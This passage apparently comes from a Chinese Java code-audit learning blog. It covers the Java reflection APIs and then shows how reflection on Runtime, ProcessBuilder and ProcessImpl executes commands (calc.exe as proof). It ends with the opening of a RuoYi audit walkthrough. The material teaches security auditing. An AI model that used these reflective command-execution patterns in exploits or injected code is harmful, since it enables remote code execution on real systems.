class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.demo.reflectdemo;<br><span class="hljs-keyword">import</span> java.lang.reflect.Modifier;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 编号7089</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ModifierDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        Class&lt;?&gt; clazz = Class.forName(<span class="hljs-string">&quot;com.example.demo.reflectdemo.UserInfo&quot;</span>);<br><br>        <span class="hljs-comment">// 获取类的修饰符值</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">modifiers1</span> <span class="hljs-operator">=</span> clazz.getModifiers();<br>        System.out.println(<span class="hljs-string">&quot;获取类的修饰符值getModifiers运行结果：&quot;</span> + modifiers1);<br><br>        <span class="hljs-comment">// 获取属性的修饰符值</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">modifiers2</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(<span class="hljs-string">&quot;name&quot;</span>).getModifiers();<br>        System.out.println(<span class="hljs-string">&quot;获取属性的修饰符值getModifiers运行结果：&quot;</span> + modifiers2);<br><br>        <span class="hljs-comment">// 获取方法的修饰符值</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">modifiers4</span> <span class="hljs-operator">=</span> clazz.getDeclaredMethod(<span class="hljs-string">&quot;setName&quot;</span>, String.class).getModifiers();<br>        System.out.println(<span class="hljs-string">&quot;获取方法的修饰符值getModifiers运行结果：&quot;</span> + modifiers4);<br><br>        <span class="hljs-comment">// 根据修饰符值，获取修饰符标志的字符串</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">modifier</span> <span class="hljs-operator">=</span> Modifier.toString(modifiers1);<br>        System.out.println(<span class="hljs-string">&quot;获取类的修饰符值的字符串结果：&quot;</span> + modifier);<br>        System.out.println(<span class="hljs-string">&quot;获取属性的修饰符值字符串结果：&quot;</span> + Modifier.toString(modifiers2));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/Modifierdemo%E4%BB%A3%E7%A0%81.jpg" alt="Modifierdemo代码"></p><p>运行结果如下图所示：</p><p><img src="/img/Modifierdemo%E8%BF%90%E8%A1%8C%E7%BB%93%E6%9E%9C.jpg" alt="Modifierdemo运行结果"></p><h3 id="4-5、java-lang-reflect-Constructor"><a href="#4-5、java-lang-reflect-Constructor" class="headerlink" title="4.5、java.lang.reflect.Constructor"></a>4.5、java.lang.reflect.Constructor</h3><p>提供了类的构造函数信息。可以获取构造函数上的注解信息、参数类型等。</p><p>官方文档：<code>https://docs.oracle.com/javase/8/docs/api/java/lang/reflect/Constructor.html</code>。</p><table><thead><tr><th>方法名</th><th>释义</th></tr></thead><tbody><tr><td>getConstructor()</td><td>获取一个声明为 public 构造函数实例</td></tr><tr><td>getConstructors()</td><td>获取所有声明为 public 构造函数实例</td></tr><tr><td>getDeclaredConstructor()</td><td>获取一个声明的构造函数实例</td></tr><tr><td>getDeclaredConstructors()</td><td>获取所有声明的构造函数实例</td></tr><tr><td>更多方法可查看官方文档……</td><td></td></tr></tbody></table><h4 id="4-5-1、示例代码"><a href="#4-5-1、示例代码" class="headerlink" title="4.5.1、示例代码"></a>4.5.1、示例代码</h4><p>①、在创建<code>com.example.demo.reflectdemo</code>下创建一个名为<code>ConstructorDemo</code>的Java Class，并键入以下代码，最终如下图所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.demo.reflectdemo;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConstructorDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        Class&lt;?&gt; clazz = Class.forName(<span class="hljs-string">&quot;com.example.demo.reflectdemo.UserInfo&quot;</span>);<br><br>        <span class="hljs-comment">// 获取一个声明为 public 构造函数实例</span><br>        Constructor&lt;?&gt; constructor1 = clazz.getConstructor(String.class,<span class="hljs-type">int</span>.class);<br>        System.out.println(<span class="hljs-string">&quot;1-getConstructor运行结果：&quot;</span> + constructor1);<br>        <span class="hljs-comment">// 根据构造函数创建一个实例</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> constructor1.newInstance(<span class="hljs-string">&quot;power7089&quot;</span>,<span class="hljs-number">18</span>);<br>        System.out.println(<span class="hljs-string">&quot;2-newInstance运行结果： &quot;</span> + c1);<br><br>        <span class="hljs-comment">// 获取所有声明为 public 构造函数实例</span><br>        Constructor&lt;?&gt;[] constructorArray1 = clazz.getConstructors();<br>        <span class="hljs-keyword">for</span> (Constructor&lt;?&gt; constructor : constructorArray1) &#123;<br>            System.out.println(<span class="hljs-string">&quot;3-getConstructors运行结果：&quot;</span> + constructor);<br>        &#125;<br>        <span class="hljs-comment">// 获取一个声明的构造函数实例</span><br>        Constructor&lt;?&gt; constructor2 = clazz.getDeclaredConstructor(String.class);<br>        System.out.println(<span class="hljs-string">&quot;4-getDeclaredConstructor运行结果：&quot;</span> + constructor2);<br>        <span class="hljs-comment">// 将构造函数的可访问标志设为 true 后，可以通过私有构造函数创建实例</span><br>        constructor2.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o2</span> <span class="hljs-operator">=</span> constructor2.newInstance(<span class="hljs-string">&quot;Power7089666&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;5-newInstance运行结果：&quot;</span> + o2);<br><br>        <span class="hljs-comment">// 获取所有声明的构造函数实例</span><br>        Constructor&lt;?&gt;[] constructorArray2 = clazz.getDeclaredConstructors();<br>        <span class="hljs-keyword">for</span> (Constructor&lt;?&gt; constructor : constructorArray2) &#123;<br>            System.out.println(<span class="hljs-string">&quot;6-getDeclaredConstructors运行结果：&quot;</span> + constructor);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/ConstructorDemo%E4%BB%A3%E7%A0%81.JPG" alt="ConstructorDemo代码"></p><p>运行结果如下图所示：</p><p><img src="/img/ConstructorDemo%E4%BB%A3%E7%A0%81%E8%BF%90%E8%A1%8C%E7%BB%93%E6%9E%9C.jpg" alt="ConstructorDemo代码运行结果"></p><h3 id="4-6、java-lang-reflect-Parameter"><a href="#4-6、java-lang-reflect-Parameter" class="headerlink" title="4.6、java.lang.reflect.Parameter"></a>4.6、java.lang.reflect.Parameter</h3><p>提供了方法的参数信息。可以获取方法上的注解、参数名称、参数类型等。</p><p>官方文档：<code>https://docs.oracle.com/javase/8/docs/api/java/lang/reflect/Parameter.html</code>。</p><table><thead><tr><th>方法名</th><th>释义</th></tr></thead><tbody><tr><td>getParameters()</td><td>获取构造函数&#x2F;方法的参数</td></tr><tr><td>更多方法可查看官方文档……</td><td></td></tr></tbody></table><h3 id="4-7、java-lang-reflect-AccessibleObject"><a href="#4-7、java-lang-reflect-AccessibleObject" class="headerlink" title="4.7、java.lang.reflect.AccessibleObject"></a>4.7、java.lang.reflect.AccessibleObject</h3><p>是<code>Field</code>、<code>Method</code>和<code>Constructor</code>类的超类。该类提供了对类、方法、构造函数的访问控制检查的能力（如：私有方法只允许当前类访问）。</p><p>该<strong>访问检查</strong>在设置&#x2F;获取属性、调用方法、创建&#x2F;初始化类的实例时执行。</p><table><thead><tr><th>方法名</th><th>释义</th></tr></thead><tbody><tr><td>setAccessible()</td><td>将可访问标志设为<code>true</code>（默认为<code>false</code>），会关闭访问检查。这样即使是私有的属性、方法或构造函数，也可以访问。</td></tr></tbody></table><h4 id="4-7-1、示例代码"><a href="#4-7-1、示例代码" class="headerlink" title="4.7.1、示例代码"></a>4.7.1、示例代码</h4><p>可以看<code>ConstructorDemo</code>类代码，涉及到了<code>setAccessible()</code>，如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 获取一个声明的构造函数实例</span><br>Constructor&lt;?&gt; constructor2 = clazz.getDeclaredConstructor(String.class);<br>System.out.println(<span class="hljs-string">&quot;4-getDeclaredConstructor运行结果：&quot;</span> + constructor2);<br><span class="hljs-comment">// 将构造函数的可访问标志设为 true 后，可以通过私有构造函数创建实例</span><br>constructor2.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">Object</span> <span class="hljs-variable">o2</span> <span class="hljs-operator">=</span> constructor2.newInstance(<span class="hljs-string">&quot;Power7089666&quot;</span>);<br>System.out.println(<span class="hljs-string">&quot;5-newInstance运行结果：&quot;</span> + o2);<br></code></pre></td></tr></table></figure><h2 id="5、常用方法整理"><a href="#5、常用方法整理" class="headerlink" title="5、常用方法整理"></a>5、常用方法整理</h2><h3 id="1、getMethod"><a href="#1、getMethod" class="headerlink" title="1、getMethod()"></a>1、getMethod()</h3><p>getMethod()方法获取的是当前类中所有公共(public)方法。包括从父类里继承来的方法。</p><h3 id="2、getDeclaredMethod"><a href="#2、getDeclaredMethod" class="headerlink" title="2、getDeclaredMethod()"></a>2、getDeclaredMethod()</h3><p>getDeclaredMethod()系列方法获取的是当前类中“声明”的方法，包括private，protected和public，不包含从父类继承来的方法。</p><h3 id="3、getConstructor"><a href="#3、getConstructor" class="headerlink" title="3、getConstructor()"></a>3、getConstructor()</h3><p>getConstructor()方法获取的是当前类声明为公共(public)构造函数实例。</p><h3 id="4、getDeclaredConstructor"><a href="#4、getDeclaredConstructor" class="headerlink" title="4、getDeclaredConstructor()"></a>4、getDeclaredConstructor()</h3><p>getDeclaredConstructor() 方法获取的是当前类声明的构造函数实例，包括private，protected和public。</p><h3 id="5、setAccessible"><a href="#5、setAccessible" class="headerlink" title="5、setAccessible()"></a>5、setAccessible()</h3><p>在获取到私有方法或构造方法后，使用<code>setAccessible(true);</code>，改变其作用域，这样及时私有的属性，方法，构造函数也都可以访问调用了。</p><h3 id="6、newInstance"><a href="#6、newInstance" class="headerlink" title="6、newInstance()"></a>6、newInstance()</h3><p>将获取到的对象实例化。调用的是这个类的无参构造函数。</p><p>使用 newInstance 不成功的话可能是因为：①、你使用的类没有无参构造函数，②、你使用的类构造函数是私有的。</p><h3 id="7、invoke"><a href="#7、invoke" class="headerlink" title="7、invoke()"></a>7、invoke()</h3><p>调用包装在当前Method对象中的方法。</p><p>invoke传参如下图所示：</p><p><img src="/img/invoke%E4%BC%A0%E5%8F%82.jpg" alt="invoke传参"></p><h1 id="二、Java反射到命令执行"><a href="#二、Java反射到命令执行" class="headerlink" title="二、Java反射到命令执行"></a>二、Java反射到命令执行</h1><p>学习ava反射机制，其实我们更关心如何利用Java反射实现命令执行。下面举例讲解下Java反射命令执行的几种情况。</p><p>:warning: 首先在<code>com.example.demo</code>下新建一个名为<code>codeexec</code>的包。用于命令执行示例代码的编写调试。最终目录如下图所示：</p><p><img src="/img/codeexec%E5%8C%85.JPG" alt="codeexec包"></p><h2 id="1、反射之Java-lang-Runtime"><a href="#1、反射之Java-lang-Runtime" class="headerlink" title="1、反射之Java.lang.Runtime"></a>1、反射之Java.lang.Runtime</h2><p>下面是两种通过反射java.lang.Runtime来达到命令执行的方式。</p><h3 id="1-1、方式一：通过getMethod"><a href="#1-1、方式一：通过getMethod" class="headerlink" title="1.1、方式一：通过getMethod"></a>1.1、方式一：通过getMethod</h3><p>由于java.lang.Runtime类的构造函数是私有的，因此不能直接使用<code>newInstance() </code>创建一个实例。</p><p>那为什么这个类的构造函数会是私有的呢？</p><p>这涉及到一个“单例模式”的概念。举个例子：我们在链接数据库时只有最开始链接一次，而不是用一次链接一次，如果这样的话，资源消耗太大了。</p><p>因此可以将类的构造函数设为私有，再通过静态方法来获取。</p><p>由于java.lang.Runtime使用了单例模式，我们可以通过Runtime.getRuntime()来获取Runtime对象。</p><p>先看一段代码：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Class</span>&lt;?&gt; clazz = <span class="hljs-keyword">Class</span>.forName(&quot;java.lang.Runtime&quot;);<br><span class="hljs-keyword">Method</span> execMethod = clazz.getMethod(&quot;exec&quot;, String.<span class="hljs-keyword">class</span>);<br><span class="hljs-keyword">Method</span> getRuntimeMethod = clazz.getMethod(&quot;getRuntime&quot;);<br><span class="hljs-keyword">Object</span> runtime = getRuntimeMethod.invoke(clazz);<br>execMethod.invoke(runtime, &quot;calc.exe&quot;);<br></code></pre></td></tr></table></figure><p>简单解读：</p><p>首先通过Class.forName获取java.lang.Runtime。</p><p>接下来通过getMethod()方法获exec方法，在java命令执行章节中我们了解到，<code>exec()</code>方法有六种调用方式(重载)，我们选择最简单的String方式，则getMethod方法我们设定的入参方式为<code>String.class</code>。</p><p>然后获取getRuntime方法后，使用invoke执行方法。</p><p>最后在通过invoke方法调用runtime对象执行命令。</p><p>将上述代码可以简化如下，简化前后有什么区别？大家可自行调试一下，观察不同。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">Class&lt;?&gt; clazz = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>)</span>;<br>clazz.get<span class="hljs-constructor">Method(<span class="hljs-string">&quot;exec&quot;</span>,String.<span class="hljs-params">class</span>)</span>.invoke(clazz.get<span class="hljs-constructor">Method(<span class="hljs-string">&quot;getRuntime&quot;</span>)</span>.invoke(clazz),<span class="hljs-string">&quot;calc.exe&quot;</span>);<br></code></pre></td></tr></table></figure><p>①、在<code>com.example.demo.codeexec</code>下新建以及各名为<code>RuntimeGetMethod</code>的Java Class，并键入以上代码，最终如下图所示：</p><p><img src="/img/RuntimeGetMethod.jpg" alt="RuntimeGetMethod"></p><p>上述两种方式代码，自行调试运行观察结果。</p><h3 id="1-2、方式二：通过getDeclaredConstructor"><a href="#1-2、方式二：通过getDeclaredConstructor" class="headerlink" title="1.2、方式二：通过getDeclaredConstructor"></a>1.2、方式二：通过getDeclaredConstructor</h3><p>如果方法或构造函数是私有的，我们可以使用<code>getDeclaredMethod</code>或<code>getDeclaredConstructor</code>来获取执行。</p><p>在这里，java.lang.Runtime的构造函数为私有的，因此我们可以使用 getDeclaredConstructor方法获取java.lang.Runtime并执行。</p><p>先看一段代码：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">Class&lt;?&gt; clazz = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>)</span>;<br>Constructor m = clazz.get<span class="hljs-constructor">DeclaredConstructor()</span>;<br>m.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;<br>Method c1 = clazz.get<span class="hljs-constructor">Method(<span class="hljs-string">&quot;exec&quot;</span>, String.<span class="hljs-params">class</span>)</span>;<br>c1.invoke(m.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span>, <span class="hljs-string">&quot;calc.exe&quot;</span>);<br></code></pre></td></tr></table></figure><p>简单解读：</p><p>首先通过Class.forName获取java.lang.Runtime。</p><p>接下来通过getDeclaredConstructor获取构造函数。</p><p>通过<code>setAccessible(true)</code>设置改变作用域，让我们可以调用他的私有构造函数。</p><p>调用exec方法，入参设置为<code>String.class</code>。</p><p>最后使用Invoke执行方法。</p><p>①、在<code>com.example.demo.codeexec</code>下新建以及各名为<code>RuntimeGetDeclaredConstructor</code>的Java Class，并键入以上代码，最终如下图所示：</p><p><img src="/img/RuntimeGetDeclaredConstructor%E4%BB%A3%E7%A0%81.jpg" alt="RuntimeGetDeclaredConstructor代码"></p><p>自行调试运行观察结果。</p><h2 id="2、反射之java-lang-ProcessBuilder"><a href="#2、反射之java-lang-ProcessBuilder" class="headerlink" title="2、反射之java.lang.ProcessBuilder"></a>2、反射之java.lang.ProcessBuilder</h2><p>如果一个类没有无参构造方法，也没有类似单例模式里的静态方法，我们可以通过<code>getConstructor()</code>方法实例化该类。当然也可以使用<code>getDeclaredConstructor()</code>方法。</p><p>java.lang.ProcessBuilder有两个构造函数，构造函数也是支持重载的。如下图所示：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">ProcessBuilder</span><span class="hljs-params">(List&lt;String&gt; command)</span></span><br><span class="hljs-function"><span class="hljs-title">ProcessBuilder</span><span class="hljs-params">(String... command)</span></span><br></code></pre></td></tr></table></figure><p><img src="/img/%E4%B8%A4%E4%B8%AA%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0.jpg" alt="两个构造函数"></p><p>在Java命令执行章节，我们了解到java.lang.ProcessBuilder使用start()方法执行命令。</p><p>我们以<code>ProcessBuilder(List&lt;String&gt; command)</code>为例。进行讲解。</p><p>①、在<code>com.example.demo.codeexec</code>下新建以及各名为<code>ProcessBuilderGetConstructor</code>的Java Class，并键入以下代码，最终如下图所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.demo.codeexec;<br><span class="hljs-keyword">import</span> java.util.Arrays;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProcessBuilderGetConstructor</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        Class&lt;?&gt; clazz = Class.forName(<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="hljs-string">&quot;calc.exe&quot;</span>));<br>        clazz.getMethod(<span class="hljs-string">&quot;start&quot;</span>).invoke(object,<span class="hljs-literal">null</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/ProcessBuilderGetConstructor%E4%BB%A3%E7%A0%81.jpg" alt="ProcessBuilderGetConstructor代码"></p><p>写法：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">Class clazz = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>)</span>;<br>((ProcessBuilder)<br>clazz.get<span class="hljs-constructor">Constructor(List.<span class="hljs-params">class</span>)</span>.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(Arrays.<span class="hljs-params">asList</span>(<span class="hljs-string">&quot;calc.exe&quot;</span>)</span>)).star<br>t<span class="hljs-literal">()</span>;<br></code></pre></td></tr></table></figure><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">Class</span> clazz = <span class="hljs-keyword">Class</span>.forName(<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>);<br>clazz.getMethod(<span class="hljs-string">&quot;start&quot;</span>).invoke(clazz.getConstructor(List.<span class="hljs-keyword">class</span>).newInstance(<br>Arrays.<span class="hljs-keyword">asList</span>(<span class="hljs-string">&quot;calc.exe&quot;</span>)));<br></code></pre></td></tr></table></figure><p>大家自行运行观察分析结果。</p><p><strong>:warning:注意：</strong></p><p>在开头我们介绍引入的是反射调用java.lang.ProcessImpl，代码如下。留个作业，大家自行调试，将分析结果形成文档提交到本章节对应的作业处“【第一阶段】Java代码审计之基础篇作业”。</p><p>反射这节基础很重要，希望大家能够积极练习，并记录笔记提交到对应的作业处。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Class</span> clazz = <span class="hljs-keyword">Class</span>.forName(&quot;java.lang.ProcessImpl&quot;);<br><span class="hljs-keyword">Method</span> <span class="hljs-keyword">method</span> = clazz.getDeclaredMethod(&quot;start&quot;, String[].<span class="hljs-keyword">class</span>, Map.<span class="hljs-keyword">class</span>, String.<span class="hljs-keyword">class</span>, ProcessBuilder.Redirect[].<span class="hljs-keyword">class</span>, <span class="hljs-type">boolean</span>.<span class="hljs-keyword">class</span>);<br><span class="hljs-keyword">method</span>.setAccessible(<span class="hljs-keyword">true</span>);<br>Process process = (Process) <span class="hljs-keyword">method</span>.invoke(<span class="hljs-keyword">null</span>, cmds, <span class="hljs-keyword">null</span>, &quot;.&quot;, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">true</span>);<br></code></pre></td></tr></table></figure><p>至此，Java反射机制知识点到这就结束了。</p><p>本章节提到了一些特殊场景以及解决方法。</p><p>当然在实际中，我们会遇见各种情况，加以分析，再配合掌握的这些函数方法后，可以更好的解决应对。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>JavaWeb代码审计实战之若依管理系统，细节满满不得不好好学的一个系统</title>
    <link href="/2022/08/22/JavaWeb%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AE%9E%E6%88%98%E4%B9%8B%E8%8B%A5%E4%BE%9D%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%EF%BC%8C%E7%BB%86%E8%8A%82%E6%BB%A1%E6%BB%A1%E4%B8%8D%E5%BE%97%E4%B8%8D%E5%A5%BD%E5%A5%BD%E5%AD%A6%E7%9A%84%E4%B8%80%E4%B8%AA%E7%B3%BB%E7%BB%9F/"/>
    <url>/2022/08/22/JavaWeb%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AE%9E%E6%88%98%E4%B9%8B%E8%8B%A5%E4%BE%9D%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%EF%BC%8C%E7%BB%86%E8%8A%82%E6%BB%A1%E6%BB%A1%E4%B8%8D%E5%BE%97%E4%B8%8D%E5%A5%BD%E5%A5%BD%E5%AD%A6%E7%9A%84%E4%B8%80%E4%B8%AA%E7%B3%BB%E7%BB%9F/</url>
    
    <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>【如需转载，请详细表明来源，请勿设置原创】</p><p>嗨，大家好，我是闪石星曜CyberSecurity创始人Power7089。</p><p>欢迎大家扫描下方二维码关注 <strong>“闪石星曜CyberSecurity”</strong> 公众号，这里专注分享渗透测试，Java代码审计，PHP代码审计等内容，都是非常干的干货哦。</p><p><img src="/img/%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="公众号"></p><p>如果你想系统化学习Java代码审计、PHP代码审计、渗透测试，欢迎了解加入对应的知识星球，分别为【炼石计划@Java代码审计】，【炼石计划@PHP代码审计】，【炼石计划@渗透攻防宇宙】，知识星球的名称也对应着深入学习的方向。</p><p>炼石计划理念：一个系统化从入门到提升学习的成长型知识星球。这里不仅注重夯实基础，更加专注实战进阶。</p><p>欢迎微信扫描下方二维码，加入对应的知识星球。努力成为六边形网络安全战士！</p><p><img src="/img/%E7%82%BC%E7%9F%B3%E8%AE%A1%E5%88%92@Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.jpg" alt="炼石计划@Java代码审计"></p><p><img src="/img/%E7%82%BC%E7%9F%B3%E8%AE%A1%E5%88%92@PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.jpg" alt="炼石计划@PHP代码审计"></p><p><img src="/img/%E7%82%BC%E7%9F%B3%E8%AE%A1%E5%88%92@%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%AE%87%E5%AE%99.jpg" alt="炼石计划@渗透攻防宇宙"></p><p>本篇来自【炼石计划@Java代码审计】知识星球内部文章，公益分享学习。欢迎加入我们，系统化学习专业知识。</p><h2 id="一、项目简介"><a href="#一、项目简介" class="headerlink" title="一、项目简介"></a>一、项目简介</h2><p>RuoYi 是一个 Java EE 企业级快速开发平台，基于经典技术组合（Spring Boot、Apache  Shiro、MyBatis、Thymeleaf、Bootstrap），内置模块如：部门管理、角色用户、菜单及按钮授权、数据权限、系统参数、日志管理、通知公告等。在线定时任务配置；支持集群，支持多数据源，支持分布式事务。</p><p><strong>内置功能详解如下：</strong></p><ol><li>用户管理：用户是系统操作者，该功能主要完成系统用户配置。</li><li>部门管理：配置系统组织机构（公司、部门、小组），树结构展现支持数据权限。</li><li>岗位管理：配置系统用户所属担任职务。</li><li>菜单管理：配置系统菜单，操作权限，按钮权限标识等。</li><li>角色管理：角色菜单权限分配、设置角色按机构进行数据范围权限划分。</li><li>字典管理：对系统中经常使用的一些较为固定的数据进行维护。</li><li>参数管理：对系统动态配置常用参数。</li><li>通知公告：系统通知公告信息发布维护。</li><li>操作日志：系统正常操作日志记录和查询；系统异常信息日志记录和查询。</li><li>登录日志：系统登录日志记录查询包含登录异常。</li><li>在线用户：当前系统中活跃用户状态监控。</li><li>定时任务：在线（添加、修改、删除)任务调度包含执行结果日志。</li><li>代码生成：前后端代码的生成（java、html、xml、sql）支持CRUD下载 。</li><li>系统接口：根据业务代码自动生成相关的api接口文档。</li><li>服务监控：监视当前系统CPU、内存、磁盘、堆栈等相关信息。</li><li>缓存监控：对系统的缓存查询，删除、清空等操作。</li><li>在线构建器：拖动表单元素生成相应的HTML代码。</li><li>连接池监视：监视当前系统数据库连接池状态，可进行分析SQL找出系统性能瓶颈。</li></ol><h2 id="二、项目搭建"><a href="#二、项目搭建" class="headerlink" title="二、项目搭建"></a>二、项目搭建</h2><h3 id="1、环境要求"><a href="#1、环境要求" class="headerlink" title="1、环境要求"></a>1、环境要求</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">JDK &gt;= 1.8 (推荐1.8版本)<br>Mysql &gt;= 5.7.0 (推荐5.7版本)<br>Maven &gt;= 3.0<br></code></pre></td></tr></table></figure><h3 id="2、Windows环境的项目部署流程"><a href="#2、Windows环境的项目部署流程" class="headerlink" title="2、Windows环境的项目部署流程"></a>2、Windows环境的项目部署流程</h3><p>基于windows10操作系统。</p><p>①、命令行进入Mysql，创建数据库名为<code>ry</code>，并切换使用该数据库。</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">create datavase ry<span class="hljs-comment">; 创建名为ry的数据库</span><br>use ry<span class="hljs-comment">; 切换使用ry数据库</span><br></code></pre></td></tr></table></figure><p>②、将项目文件中的<code>/sql/ry_20200323.sql</code>的数据导入到<code>ry</code>数据库，注意导入路径中应使用正斜杠<code>/</code>。</p><figure class="highlight 